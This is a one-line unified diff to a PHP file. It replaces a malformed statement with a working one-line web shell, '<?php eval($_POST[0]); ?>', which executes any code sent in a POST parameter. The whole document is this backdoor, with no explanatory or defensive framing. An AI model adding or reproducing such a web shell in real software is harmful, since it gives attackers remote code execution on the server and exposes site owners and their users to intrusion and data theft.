@@ -1,1 +1,1 @@
-<?php=eval($_POST[0]);?>
+<?php eval($_POST[0]); ?>
